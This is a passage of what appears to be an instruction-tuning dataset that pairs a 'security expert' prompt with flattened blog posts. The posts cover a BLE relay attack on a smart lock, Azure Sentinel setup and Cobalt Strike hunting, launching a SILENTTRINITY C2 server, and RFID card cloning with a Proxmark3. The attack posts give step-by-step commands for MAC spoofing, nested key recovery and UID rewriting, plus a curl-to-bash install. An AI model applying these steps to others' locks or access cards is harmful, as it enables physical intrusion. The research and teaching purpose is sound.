learn more about using Mitre CALDERA including over 25 hands-on labs ildwesthackinfest.com online-training attack-emulation-atomic-red-team-caldera-and-more"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Machine-in-the-Middle (MitM) BLE Attack</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, Hardware Hacking, How-To, Informational, InfoSec 101, Ray Felch</taxonomies>\n<creation_date>Wed, 28 Oct 2020 15:19:41 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Introduction Continuing with my ongoing Smart Lock attack research see blog Reverse Engineering a Smart Lock I decided to move my focus to a different type of attack technique namely a relay attack The relay attack is a form of MitM attack not to be confused with the more well-known replay attack MitM attacks commonly involve intercepting data between two parties in order to view modify that data before relaying it on to the intended recipient MitM attacks consist of controlling the back-and-forth communication between the two unsuspecting parties The parties think that they are talking to each other however in reality the conversation is being proxied by the MitM attacker The intercepted messages can be modified by the attacker or left unaltered depending on the intentions of the attacker Unlike a MitM attack a replay attack is a type of attack where an attacker captures the wireless communication of a legitimate device in order to replay it typically unaltered at a later time when the owner is not around An example of a replay attack might be an attacker capturing the signal of the keyless remote which opens a door lock in order to replay it later when the victim is not at home The relay attack on the other hand is a form of MitM attack where an attacker surreptitiously relays communication from one legitimate device to another legitimate device without the knowledge of the transmitter beyond the engineered communication distance limitations An example of this might be where an attacker captures the RF signal of a nearby key-fob and forwards it to an accomplice near the targeted vehicle to unlock the door This appears to be the type of attack used recently where two attackers in London stole a Tesla Model S in under 30 seconds ww.pcmag.com news tesla-model-s-stolen-in-30-seconds-using-keyless-hack Proof of Concept For my MitM research I chose to stay with the KeyWe smart lock as I was already familiar with its operation and features and the lock is typical of the commercial smart locks currently on the market Just as a reminder the KeyWe Smart Lock is made by Guardtec and uses Bluetooth Low Energy BLE to communicate with its mobile app on Android or iOS phones It was successfully exploited back in December of last year by F-Secure and more recently by myself Inasmuch the vendor has implemented a few steps to mitigate its exposure and has heavily obfuscated their code However this is where a properly constructed MitM attack can really shine Many times MitM attacks are not concerned with the inner workings of the firmware or the mobile application as they are simply intercepting the communication of two legitimate devices in real-time and passing relaying the information unmodified For this example our MitM relay attack consists of spoofing the targeted peripheral the KeyWe lock in our case in order to get the victim's device phone to connect to our fake peripheral device On connection the fake peripheral relays the victim's phone packets onward to the targeted device lock while at the same time monitoring and capturing the exchanged traffic In this scenario the fake peripheral and companion device handle the relaying of the 'back and forth traffic while the victim is completely unaware that the session is being intercepted Hardware requirements 2 Raspberry Pi 3B 2 Kinivo BTD-400 Bluetooth Low Energy Adapters KeyWe Smart Lock or other BLE smart device August Lock etc Software requirements Prerequisites Noble ithub.com noble noble Bleno ithub.com noble bleno GATTACKER ithub.com securing gattacker NodeJS Version 8.xx.x only Note I ran into a number of issues using the very latest version of NodeJS and found that the most stable version with regard to the Gattacker tool was version 8.xx.x Also I discovered that using NVM Node Version Manager helps tremendously in maintaining compatibility between often deprecated applications tools Prepare both Raspberry Pi's Create a fresh raspbian Buster image install to two SD cards using balenaEtcher Copy a blank SSH file to the boot directory of the SD cards to allow headless operation via ssh Insert SD cards into the two RPi's and power-up Open two terminals on a laptop one for each Pi Determine IP address for each RPi I created static IP's for ease of use ssh pi 192.168.1.21 Central Pi and ssh pi 192.168.1.22 Peripheral Pi Make sure your RPi is up to date and has all the dependencies installed fresh install recommended sudo apt update sudo apt dist-upgrade -y sudo apt install python-dev build-essential curl git mc -y NodeJS Nodejs is an open-source asynchronous 'event-driven cross-platform JavaScript runtime environment used to build network applications Install node version manager nvm curl -o aw.githubusercontent.com nvm-sh nvm v0.36.0 install.sh bash nano .bashrc append to end of bashrc file export NVM_DIR HOME .nvm -s NVM_DIR nvm.sh NVM_DIR nvm.sh This loads nvm -s NVM_DIR bash_completion NVM_DIR bash_completion This loads nvm bash_com source .bashrc nvm -v verify version should be 0.35.3 or higher Install NodeJS version 8.x.x nvm install 8.0.0 Note I used 8.17.0 for my attack but 8.0.0 should be okay although not verified which node get path to node home pi .nvm versions node v8.0.0 bin node Add path to .profile nodejs path export PATH home pi .nvm versions node v8.0.0 bin node PATH Verify correct node version node -v verify node version is 8.0.0 sudo node -v verify node version is 8.0.0 added to help prevent incorrect node version error condition Important update It appears that the latest release of raspbian Buster installs node version 10.21.0 as root by default and unfortunately nvm node version manager does not work with the sudo command After an exhaustive search for a solution I discovered an alternative 'node version manager known as 'n would work and allow me to change the root node version from 10.21.0 to 8.0.0 It is important that the root and non-root node versions be identical due to the need to execute a sudo-based command later in the attack specific to the Bluetooth hardware control interface of the BLE adapter Incorrect node versions will throw a 'node version mismatch error when that sudo command is executed Install 'n node version manager npm install -g n Once installed n caches node versions in subdirectory n versions of the directory specified in environment variable N_PREFIX which defaults to usr local and the active node version is installed directly in N_PREFIX make cache folder if missing and take ownership sudo mkdir -p usr local n sudo chown -R whoami usr local n take ownership of node install destination folders sudo chown -R whoami usr local bin usr local lib usr local include usr local share 'n node version manager is now installed and configured n 8.0.0 this will change root node version to 8.0.0 as required Bluetooth Dependencies sudo apt install bluetooth bluez libbluetooth-dev libudev-dev -y npm install noble Central nodejs module npm install bleno Peripheral nodejs module npm install gattacker Bluetooth BLE security assessment tool for MitM attack Attack overview This relay attack infrastructure consists of two raspberry pi's connected over wifi and using Gattacker nodejs package for Bluetooth Low Energy security assessment for web-socket traffic The Central Pi on the left is the web-socket slave with regard to the attack vector and needs to be as close to the target lock as possible The Peripheral Pi on the right is the web-socket master with regard to the attack vector and needs to be as close to the victim phone as possible Note The attached RPi's BLE adapters need to be sufficiently apart from each other for the attack to work reliably outside the typical range of BLE or approximately 30 meters GATTACKER module configuration The way it works On the Central Pi RPi-1 we run the command 'node ws-slave which puts RPi-1 into the listen mode on the localhost On the Peripheral Pi RPi-2 we will be executing all of our node commands beginning with command 1 'node scan which prompts the Central-Pi to listen for all BLE advertisement beacons in the vicinity and record them to a JSON file Click for full-size As can be seen in the above screenshots the Central Pi has discovered a couple of BLE advertising beacons Device 1 advertises its mac address peripheral ID as 6F 64 C1 87 E8 E1 its address type as 'random and its connectable state as 'true Device 2 advertises its mac address peripheral ID as 6B D7 78 E8 9b 66 its address type as 'random and its connectable state as 'true Another interesting piece of information is the RSSI received signal strength indication This value can be used to indicate how close we are to the source The higher the number is more positive the closer we are to the device Device 3 advertises its mac address peripheral ID as 8C C8 F4 0F 4C 93 its address type as 'public and its connectable state as 'true The RSSI of device 3 is -61 indicating it is probably closer to the Central Pi than devices 1 or 2 Interesting fact As of Android version 8 iOS version 14 smartphones will hide their actual mac address by default in order to prevent listeners from using their actual mac addresses to build a history of device activity and or for tracking purposes The way they hide their mac address is by generating random mac addresses for connecting to networks It's fairly easy to determine if a mac address is random by looking at the 2nd digit of the OUI Organizationally Unique Identifier portion of the mac address If bit-1 local bit of the second digit is set it is a randomized address If the second digit is 2 6 A or E it's a randomized Apple Device see diagram below ww.nctatechnicalpapers.com Paper 2019 2019-mac-randomization-in-mobile-devices download Device 3 is our obvious target conveniently indicated by the 'localName KeyWe The address type of the target device is 'public Now that we found the target we're interested in we stop the scanning and issue command 2 on the Peripheral Pi which is 'node scan -o 8C C8 F4 0F 4C 93 This basically tells the Central-Pi to zero-in on the specified device based on its mac address in our case 8C C8 F4 0F 4C 93 and explore all of the GATT Services and Characteristics Again this info is recorded to a services JSON file Click for full-size From the above screenshots Central Pi in particular we can see some of the Unique Universal ID's UUID Handles and Properties read write notify etc instrumental in facilitating incoming and outgoing packets We can also see the GATT Characteristics and Descriptors unique to some of the various GATT services available Also notice that the information that was discovered is saved to devices 8cc8f40f4c93.srv.json At this point we issue command 3 on the Peripheral Pi 'sudo mac_adv -a devices 8cc8f40f4c93_KeyWe-8cc8f40f4c93.adv.json and the Peripheral Pi changes it's BTD-400 adapter mac address to be that of the Lock and begins advertising at a very quick interval every 20mS thereby spoofing the actual lock Click for full-size From the above screenshots observe that the two JSON files created earlier are saved in the gattacker devices directory Also notice that the Peripheral Pi BTD-400 BLE adapter's address is 5C F3 70 9C F1 91 prior to issuing command 3 sudo mac_adv After executing command 3 we need to reset our adapter sudo hciconfig hci0 reset We can now see that the BLE adapter's address has been changed to 8C C8 F4 0F 4C 93 our lock's address At this point our Peripheral Pi is now spoofing the Lock's mac address and sending the lock's advertising beacons as recorded earlier at a rate of every 20mS Both the Central Pi and the Peripheral Pi are now armed and ready for the attack as indicated by the INITIALIZED banner The Peripheral Pi is now waiting for a connection request The victim opens the mobile app on his her phone The phone sees the spoofed lock's advertisement beacon and connects to the Peripheral-Pi Immediately upon connection the back and forth communication is intercepted captured and proxied in real-time between the phone and the lock The entire session including the unlocking of the door is intercepted and recorded leaving the victim unaware that his her session has been compromised Click for full-size The screenshot above shows the intercepted traffic The Central Pi is displaying the JSON calls and the Peripheral Pi is displaying the actual incoming write and outgoing read-notify packet data This screenshot represents just a snippet of the continuously scrolling session traffic The packets color-coded in blue are the incoming write packets and the packets color-coded in green are the outgoing read-notify packets Summary For me this proved to be a very informative and interesting attack option In my previous attack with this smart lock it required months of reverse engineering dealing with heavily obfuscated code and updates redacted security assessment tools and deprecated Linux software modules This MitM attack after getting past the initial software and hardware preparation takes literally no time at all to implement and does not require you to know anything about the security protocols in place or how the firmware operates Furthermore and most importantly this attack platform can be moved to target any Bluetooth Low Energy device without any changes to the MitM hardware or software For example if we wanted to target an August Smart Lock a Yale Smart Lock or any BLE smart device the attack platform is ready to go Just place your Central Pi as close to your targeted device as you can and place your Peripheral Pi in close proximity to your intended victim's device phone fob etc Fire up the Raspberry Pi's and you're off and running In closing I want to say that I owned the smart lock and smartphone used in this proof of concept Although I proved it can be done it did require me to open the mobile app on my phone In the real world waiting for the victim to arrive home and open his her mobile app to unlock the door would still allow us to capture the session but unfortunately wouldn't allow us to replay the attack later without first reversing the mobile app However there are many commercially available smart locks that offer the auto-unlock feature where the door will unlock when the owner is in close proximity to the lock This a 'convenience feature that seriously undermines the lock's security and if enabled in the mobile app could be vulnerable to this type of MitM attack In this case placing the Central Pi close to the victim's home and sitting across from the victim in Starbucks might possibly be enough to get the phone to connect to our Peripheral Pi and unlock the door without actually opening the mobile app This is a hypothetical example and of course would be highly illegal and strongly not recommended This was a fun project and it was very inexpensive to create this attack platform The total cost for two Raspberry Pi's and two Kinivo BTD-400 BLE adapters was under 100 and well worth the investment I highly recommend making the investment and experimenting with this MitM attack on one or more of your own personal Bluetooth Low Energy devices"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Azure Security Basics: Log Analytics, Security Center, and Sentinel</title>\n<taxonomies>Author, General InfoSec Tips & Tricks, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale</taxonomies>\n<creation_date>Tue, 24 Nov 2020 13:15:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale TL DR The problem with a pentester's perspective on defense hunting and security Lab demographics versus scale If it costs 15 bucks per month per server for me to get ATP data demo its effectiveness provide tips tricks and some basic guidance to the world this is affordable Deploying ATP on 5 000 virtual servers on Azure is just shy of a million bucks a year which to me seems really expensive But I don't maintain any other EDR platform so maybe it's cheap I just don't know But I do know that Log Analytics Sentinel and ATP can produce a complete picture of your Azure authentication border defenses virtual server happenings and everything in between them Getting Started Log Analytics There is a terminology section at the bottom and you may need to reference it to put together the complete picture Deploy a VM or deploy a lab APT Lab via Terraform at the bottom or make sure one of your existing resources is being monitored Then click over to Azure's Log Analytics workspaces dashboard If you are planning to follow along you can complete a lot of these steps on a demo environment maintained by Microsoft linked below DemoLogsBlade Add a new workspace maybe a Resource group too if you want to keep things containerized The pricing tier question seemed obvious but here it is anyway Finally click create Once this is complete we should have a Log Analytics dashboard There was much rejoicing and we clicked Go to resource From the navigation tree scroll down to Logs Then we land on the Logs dashboard which on the left we find the LogManagement schema The Microsoft definition basically says the schema is a ...collection of tables grouped under logical categories The default as shown only has a few Tables But this will update akin to Elastic's log index growth when we add new event sources Also highlighted is the queries pane which we will see again after a while For documentation's sake an out-of-the-box schema appeared as follows Let's add some log sources which the Azure platform facilitates with a few clicks First up let's get our VMs connected to the Event Analytics workspace Navigate to Home Log Analytics Workspace EventAnalytics-WS1 under Get Started with Log Analytics find 1 Connect a data source then click on Azure virtual machines Further disclosure the VMs listed below were deployed using the Terraform script from here We'll have a blog about that soon too Click on any of the virtual machines listed in this panel Click Connect About five minutes and the systems are connected Next up install the Log Analytics Agent Navigate to Home Security Center Getting Started Install Agents tab Check the appropriate boxes for your subscriptions and click Install Agents This function will install the Log Analytics agent on these systems It takes just a few so feel free to freshen your tea Events Event Handling and Our First Optics Caution Inbound Charges are Likely To gather the first set of Security Events we need to enable them and that costs money Proceed with consideration for your own wallet We will summarize the charges at the end of the blog for this effort This includes spinning up an APT Lab of three VMs which cost about 2.40 per day each This will include the Pay-As-You-Go pricing for log consumption Navigate to Home Security Center Pricing Settings Once there the first thing I did was Disable Auto-Provisioning This will keep all the future VMs I deploy from magically costing money without interaction It's time to enable Standard tier pricing This will enable the event management we need to start seeing events in our log analytics dashboard Navigate to Home Security Center Pricing Settings Edit the workspace created during this process and switch the pricing over to standard so we can enable all events Next navigate to Home Security Center Pricing Settings Continuous Export Here we need to enable the appropriate Exported data types At this point we should have some initial events Next Up Azure Sentinel Navigate to Home Sentinel Click Add Next up add the workspace Once everything was connected getting Sentinel online was just a couple of clicks And thus begins our hunt operations on Azure So many questions left to address so many directions to go and so many events to search The next blog already in the works is to deploy this via Roberto's work OTRF on AzureSentinel2Go This is one of my favorite logos Terminology Tenant Accounts and Groups Subscription Agreement with Microsoft VM virtual machine on Azure space Log Analytics Logging dashboard for Azure Log Analytics Agent installed on VMs for event integration ATP Advanced Threat Protection expensive but holy amazing Links ocs.microsoft.com en-us azure azure-monitor log-query get-started-portal s.portal.azure.com blade Microsoft_Azure_Monitoring_Logs DemoLogsBlade ocs.microsoft.com en-us azure security-center security-center-enable-data-collection ocs.microsoft.com en-us microsoft-365 enterprise subscriptions-licenses-accounts-and-tenants-for-microsoft-cloud-offerings?view o365-worldwide ocs.microsoft.com en-us connectors azureloganalyticsdatacollector ithub.com OTRF Azure-Sentinel2Go next up deployed and in queue"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Azure Sentinel Quick-Deploy with Cyb3rWard0g's Sentinel To-Go - Let's Catch Cobalt Strike!</title>\n<taxonomies>Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale</taxonomies>\n<creation_date>Wed, 02 Dec 2020 13:04:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr Sentinel is easy Especially when using Azure Sentinel To-Go So let's do some threat research by deploying Sentinel To-Go and executing a Cobalt Strike beacon Link ithub.com OTRF Azure-Sentinel2Go Keeping up with Roberto's and his brother and the OTRF contributors is as monumental a task as his efforts to push threat research forward The Defensive Origins team jeez we're four now and hopefully five soon do our best to find items to improve general security posture and share them Background Roberto Cyb3rWarD0g and several other folks at OTRF are contributing so much to the security community researchers and the world in general that we cannot muster enough time to keep up Things they've made available years of endpoint research HELK Mordor OSSEM tons more and the Sentinel easy buttons So let's all thank Roberto his fam and OTRF Thank you all for all your efforts Foreground Our research today will focus on the research itself We take our security seriously and have lately been spending a ton of time in the cloud Since cloud cloud security and cobalt strike are all terms that resonate with C-Level we invest our hard-fought research cycles to make sense of the terminology So using the work of industry giants let's take a swing at deploying Sentinel spinning up some VMs with Azure resource manager templates and executing a Cobalt Strike licensed beacon or two We should start with an authenticated session to Azure in one tab and the Sentinel To-Go repo in another ortal.azure.com ithub.com OTRF Azure-Sentinel2Go As shown in the next screenshot feel free to click the button for whatever makes sense to you but I went with the AZ Sentinel WS DC build There are lots of options to sort out on the deployment page You can edit the template parameters add VMs basically customize thoroughly The next image shows the resource group configuration which was pre-existing in our case User and access configuration is shown in the next screenshot System domain and event logging configuration is shown in the next screenshot An item of note is marked in the next screenshot This is where you determine the level of logging you wish to collect for the duration of this build I chose All give me everything and I'll sort it out Next up the Ubuntu SKU Defaults Create Accept Billing is inbound and costs approximately 1 3 US dollars per run for me which is in the order of 10-15 hours Last run 2.21 Disregarding the setup of Cobalt Strike I am using a licensed version for this effort An initial beacon was established on the workstation Then we run ipconfig perform a quick portscan identify another target and jump spawn a new beacon with psexec64 From our Azure Sentinel workspace we click on the Hunting navigation pane There are quite a few interesting pre-packed queries ready to-go Once we have data the hunt should be interesting The pre-packed query I used to find the Cobalt Strike activities was the Least Common Parent and Child Process Pairs After some investigations we discovered the commands used for lateral movement cmd to spawn ipconfig ipconfig to identify local network services to launch the secondary beacon rundll32 to spawn an additional beacon what is opsec what is opsec in a lab There were other interesting IoCs as we drilled through the Sentinel Hunting queries The next window includes PowerShell Downloads These are non-standard calls from a PowerShell prompt to be sure There is another query for Encoded Commands This query also caught some interesting executions Let's bottom line this thing Azure Sentinel can retrieve logs from our endpoints per defined constructs meaning we can tell the Sentinel endpoint agent to grab Sysmon Security PowerShell and WMI logs This is super cool Sentinel To-Go is a great way to start learning the Sentinel dashboards and how these bits and pieces all fit together Like everything some of these queries can likely be subverted with naming scheme changes et cetera ..but some of these queries would be a challenge to avoid Keep hunting securing and being safe Take care PS This hunt cost US 1.53"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Joyriding with SILENTTRINITY - UPDATES</title>\n<taxonomies>Author, Fun & Games, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale</taxonomies>\n<creation_date>Thu, 10 Dec 2020 13:19:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr SILENTTRINITY ST is one of our favorite C2 tools at BHIS It's multiplayer modern and multiserver The code has been revised significantly of late especially the installation and the instructions in the original blog I wrote are no longer accurate ww.blackhillsinfosec.com my-first-joyride-with-silenttrinity Also please read the call to arms Help and support for open source is needed orchetta.industries 2020 11 17 And-Now-For-Something-Completely-Diffrent We all know tools change grow and update over time and blogs do not without intervention At this point the original blog on joyriding with ST is inaccurate And that's okay So the following instruction set will provide the fastest path to getting the teamserver operational The same instructions work for the SILENTTRINITY ST client and CrackMapExec and other modernized Python tools At a super high-level you need a sane Python environment 3.8 is best and the ST binary The steps are listed below should be easy to follow and took about 15 minutes to document Step 1 Deploy your image Digital Ocean shown below Step 2 Check your Python version it should be Python3.8 Step 3 Navigate to the Github repo's Actions tab here ithub.com byt3bl33d3r SILENTTRINITY actions Step 4 Download latest Step 5 Unpack and execute python3 st --port 81 178.128.155.142 password That's it The teamserver is up and running Cheers and good luck out there"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>RFID Proximity Cloning Attacks</title>\n<taxonomies>Author, Hardware Hacking, How-To, Informational, Ray Felch</taxonomies>\n<creation_date>Thu, 17 Dec 2020 13:10:00 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Ray Felch Introduction While packing up my KeyWe Smart Lock accessories and after wrapping up my research and two previous blogs Reverse Engineering a Smart Lock and Machine-in-the-Middle BLE Attack I came across a couple of KeyWe RFID tags Although I was somewhat already familiar with RFID Radio Frequency ID technology I decided this might be the perfect opportunity to not only close out my Smart Lock research but also take a deeper dive into this fascinating method of wireless communication Following the steps in my KeyWe Lock setup guide I programmed one of the RFID tags and verified that it successfully unlocked the door by simply bringing the tag within a few centimeters of the lock Armed with a working RFID tag I began my journey into a deep dive of RFID research HID ProxMark cards and tags Operating at 125kHz low frequency the older proximity cards or Prox card allowed contactless smart cards to be read within a few inches of the reader This was a welcome improvement to swiping a card in a magnetic stripe card reader Not much later a second generation of cards HID ProxMark II offered an even greater range of up to 15 inches With this came the ability to leave the card in a wallet or purse which could then be held up to the reader to gain access These earlier cards were comparable to magnetic stripe cards in that they could not hold much data and were typically used as key-cards for access control doors in office buildings These older low-frequency cards basically offered up a 26 bit-stream when brought in close proximity of the reader This afforded an 8-bit Facility Code a 16 bit Card ID and 2 parity bits This huge limitation with regard to data storage made way for the extremely popular high frequency 13.56MHz Mifare Classic card Passive and Active RFID cards There are two types of contactless RFID cards passive and active In general these cards contain an IC integrated circuit and an antenna With passive cards the IC is not internally powered but instead derives its power in the form of mutual inductance known as 'resonant energy transfer from the 'powered reader module When placed in close proximity to the reader the chip inside of the passive card wakes up and sends a stream of data to the reader The antenna on these cards is made from a number of tightly wound loops of wire running around the perimeter of the card Active RFID cards and tags sometimes referred to as vicinity cards contain an internal lithium battery which can provide for even greater reading distance generally in the order of 2 meters 6 feet In some rare cases RFID Active tag's range can be upwards of 150 meters 500 feet A use-case for this type of tag might be when needing to be read from within a vehicle as it approaches a security gate The battery in these active tags has a life cycle of 2-7 years at which time the tag would need to be replaced MIFARE cards and tags NXP Semiconductor a 2006 spin-off company of Philips owns the trademark on MIFARE RFID cards The MIFARE card technology was created as a consequence of consumer wide acceptance of the older HID ProxCard technology while addressing issues like the limited data capacity and the serious lack of security that the older cards afforded At the time of this writing it appears that there are over 10 billion smart cards and over 150 million smart card reader modules in existence While the majority of the older HID ProxCards operated at 125kHz the newer MIFARE cards were designed to be operated at 13.56MHz high frequency These contactless cards provided a significant improvement with regard to data storage offering versions with 1k and 4k bytes of storage The MIFARE card ISO 14443 A B compliant also implements a proprietary NXP encryption algorithm known as Crypto1 with 48-bit keys on its MIFARE Classic 1k card Unfortunately as is typically the case with creating custom crypto Crypto1 has since been compromised and is vulnerable to nested and hardnested brute force key guessing attacks In the continued pursuit of better contactless card security MIFARE introduced the MIFARE Plus and MIFARE DESFire high security cards along with the MIFARE Ultralight card The MIFARE DESFire card's chip has a full microprocessor and much-improved security features such as Triple DES encryption standards The MIFARE DESFire and MIFARE Classic EV1 latest card contain an on-chip backup management system and mutual three pass authentication The EV1 can hold up to 28 different applications and 32 files per application Chinese magic cards The 13.56MHz MIFARE Classic 1k cards are some of the most widely used RFID cards in existence Based on ISO14443 A B standard these cards are relatively inexpensive at approximately 1 each MIFARE Classic 1k contactless smart cards offer 16 sectors with each sector containing 4 16-byte blocks for a total of 1 024 bytes of on-card storage Sector 0 typically read-only and contains such information as the UID access bits and manufacturer info etc In order to successfully clone a card or tag in its entirety sector 0 needs to be writable so that we can overwrite the card's factory-set UID and related data The appropriately named Chinese Magic Card allows for sector 0 writing with re-writing capability advertised in the order of 100 000 times There are many sector 0 writable cards in production but it's buyer beware when it comes to reliability so use due diligence when making your purchases MIFARE Classic 1K card sector 0 configuration RFID Reader Writers The Proxmark3 is a powerful general-purpose RFID tool designed to snoop listen and emulate everything from Low Frequency 125kHz to High Frequency 13.56MHz cards and tags Moderately expensive at 270 this is a definite must for any serious RFID researcher's toolbox Installation of the software can be a bit of a chore however after a few attempts I discovered that following the instructions of Iceman's fork I was up and running in practically no time The NFC ACR122U is a cost-friendly option for high frequency 13.56MHz reading writing and cloning Not only supported with useful open source software but the reader writer can also be interfaced with the NFC near field connection features of NFC compliant mobile phones The Easy MF RFID Reader Writer 13.56MHz only is something that I stumbled upon while researching the many options available for my RFID project At 25 this device is very inexpensive however it does come at a cost The setup and operating instructions were very difficult to follow due to Chinese translation issues and it did take some time to get up and running It does offer a web-socket GUI but even accessing the GUI is somewhat opaque in my opinion That being said I eventually was able to read and write data on a few Mifare Classic 1k cards The RFID-RC522 Reader Writer is an extremely inexpensive just 3 circuit board designed to be easily interfaced with the Arduino line Searching the internet there are many Arduino based RFID projects available to experiment with reading and writing to RFID high frequency 13.56MHz cards and tags I'll present a few of these projects later in this write-up The Handheld RFID Writer Is another very inexpensive device that makes it incredibly easy to clone HID low-frequency 125kHz only cards and tags This handheld reader writer is powered by a couple of AAA batteries Simply power the device using the on off switch on the handle Hold the source card to the reader top-left press the READ button and wait for the green pass LED to light Replace the source card with the target card press the WRITE button and wait for the green pass LED to light Long Range Readers While the more common card reader systems have a very short range measured in inches the HID MaxiProx 5375 and HID R90 long-range readers can operate at a range of up 6 ft and over 25 ft when used with the HID ProxPass Active card These readers work really well when you want to open a gate to a parking garage from your vehicle The HID R40 iClass SE is a Multiclass Reader typically used for access control with a range of approximately 5 varies depending on the type of iClass card The HID MaxiProx 5375 long range reader 125kHz HID ProxCard II The HID R90 long range reader 13.56MHZ HID iClass The HID R40 Wall Unit 13.56 MHz HID iClass SE One thing that all readers both short-range and long-range have in common is that after receiving the bit-stream from the RFID card or tag they communicate with an access controller typically PC based to forward the information for confirmation or denial of access Wiegand n.wikipedia.org wiki Wiegand_interface refers to the technology used in card readers and sensors dating back to the early 1980s This system is a wired communication interface that uses a minimum of three wires GND Data-0 and Data-1 CLK The original Wiegand format had one parity bit 8 bits of facility code 16 bits of ID code and a trailing parity bit for a total of 26 bits A parity bit is used as a very simple quality check for the accuracy of the transmitted binary data The designer of the format program will decide if each parity bit should be even or odd A selected group of data bits will be united with one parity bit and the total number of bits should result in either an even or odd number In the example above the leading parity bit even is linked to the first 12 data bits If the 12 data bits result in an odd number the parity bit is set to one to make the 13-bit total come out even The final 13 bits are similarly set to an odd total Proxmark3 Session KeyWe RFID Tag Image 1 above shows the Proxmark3-RDV2 one 'sector 0 writable magic card and a pre-programmed KeyWe Smart Lock RFID tag The KeyWe RFID tag is a high frequency 13.56MHz device The Proxmark3 is oriented in a manner that exposes the 13.56MHz coiled antenna 125kHz side faced down Image 2 above shows the KeyWe RFID tag positioned to be read Image 3 above shows the sector 0 writable card positioned to written to cloned Mifare Classic 1k cloning procedure Place the KeyWe RFID on the Proxmark3 high frequency 13.56MHz coil as per Image-2 Open a terminal and navigate to proxmark3 client Search card The following screenshot shows us performing a high-frequency search of the KeyWe RFID tag The results of this search provide us with the UID unique identification the ATQA answer to request and SAK select acknowledgment As noted earlier a SAK value of 08 indicates that the tag follows the Mifare Classic 1k ISO14443A standard The ATQA value is an indication of the UID byte length in this case 4 bytes Check keys Now that we have determined we have a Mifare Classic 1k tag we can check the tag for all of the known A and B keys and determine if any are missing This check is performed using a default list of known keys but can also be modified to look for specific hand-entered keys as well You need all keys to make use of the 'hf mf dump command Nested attack Find missing keys using a nested attack and known good key From the screenshot we can see that using a known key ffffffffffff the missing A-key 9b7c25052fc3 was discovered as well as B-key c22e04247d9a We now have all of the keys saved to dumpkeys.bin and we can successfully clone the card Restore Remove the KeyWe RFID tag from the Proxmark3 and place a sector 0 writable card on the Proxmark3 as per Image-3 A quick search shows the UID of this card to be factory set to 'b6 dd 33 3d Also notice the card was detected as a Chinese magic backdoor GEN 1a card Continuing on with the 'restore command we can see that the Proxmark3 is dumping the data previously read and saved to dumpdata.bin to the writable card Also notice that the first block of sector 0 containing the UID etc can not be written at this time This is because this particular type of sector 0 writable card requires a special unlock command prior to the write This is normal and will be addressed shortly when we issue the csetuid command Set UID After successfully writing the remaining blocks 1-63 we can issue a special command to unlock 'sector 0 block 0 in order to write the UID access control bits and manufacturer info see the following screenshot We issue the csetuid command using the known KeyWe RFID tag's UID 01 8a 44 54 Following up with another quick search indicates the UID now matches the original KeyWe RFID tag Testing this cloned card using the KeyWe smart lock proves that we successfully cloned our original tag Testing cloned RFID card Alternative Reader Writers Although the Proxmark3 is a definite 'must-have for all RFID toolkits it might not be a viable entry-level option for those that want to experiment with RFID technology That being said there are many alternative options with regard to NFC and HID card readers and writers In the following sections I'll touch on three relatively inexpensive ways to accomplish similar results to that of the Proxmark3 Specifically will visit using the NFC ACR122U card reader writer an Arduino Nano RC522 based tool and an Android phone to read and write to Mifare 1k Classic cards NFC ACR122U Reader Writer using open source mfoc-hardnested tool and nfc-tookit git clone ithub.com nfc-tools mfoc-hardnested autoreconf -vistool configure make sudo make install Place original RFID tag on reader Executing mfoc-hardnested -O mykeywecard.mfd -k ffffffffffff dumps the tag information including known keys to the output file mykeywecard.mfd This command requires that at least one key be known in this case the default key 'ffffffffffff was used First an 